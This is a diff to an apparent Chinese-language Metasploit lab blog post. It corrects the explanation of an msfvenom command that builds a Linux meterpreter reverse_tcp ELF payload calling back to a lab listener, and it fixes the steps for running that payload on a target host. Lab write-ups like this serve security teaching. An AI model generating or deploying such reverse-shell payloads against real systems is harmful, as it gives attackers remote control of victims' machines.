@@ -1,7 +1,8 @@
 ---
+translation_id: metasploit-lab
 title: "Metasploit 木马实验记录"
 date: 2022-09-18 23:29:09
-tags: ["Metasploit", "msfvenom", "木马"]
+tags: ["Metasploit", "msfvenom"]
 categories:
   - ["网络安全", "安全实验"]
 cover: https://res.cloudinary.com/sycamore/image/upload/v1792216255/Covers/87d91c5d20cc130aa72fe99c74a9e8c2.png
@@ -58,8 +59,8 @@ Kali 中默认安装了 **Metasploit** 框架。
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -o /root/payload.elf`![image-20251214010433724](https://res.cloudinary.com/sycamore/image/upload/v1792696656/Typora/2025/12/09553b61c2c9d88fe78ede3ea742468a.png)
 
 
-其中，**-p** 选择生成的木马为：**linux/x64/shell_bind_tcp**；
-**RHOST** 指定将要攻击的**目标主机**的**IP**；
+其中，**-p** 选择生成的木马为：**linux/x86/meterpreter/reverse_tcp**；
+**LHOST** 指定样本回连的监听主机 IP 地址；
 **LPORT** 指定对应端口号（默认为4444，故可以不写）；
 **-f** 指定生成木马文件的文件**类型**为 **elf**
 **-o** 指定保存生成的木马文件的**地址**为：**/root/payload.elf**
@@ -138,4 +139,4 @@ Kali 中默认安装了 **Metasploit** 框架。
 - 目标服务器：
 1. 下载木马文件
 2. `chmod +x payload.elf`
-3. `./ payload.elf`
+3. `./payload.elf`
